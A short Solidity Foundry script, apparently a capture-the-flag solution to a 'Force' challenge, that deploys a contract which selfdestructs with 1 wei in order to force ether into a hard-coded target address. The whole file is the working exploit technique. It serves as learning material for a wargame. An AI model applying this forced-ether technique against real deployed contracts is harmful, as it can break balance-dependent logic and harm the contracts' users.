// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
// import "forge-std/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {
     
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x324Ac334232f8f3d6b4aaa8a93458FbEd9B4CCdc));
        vm.stopBroadcast();
        
    }
}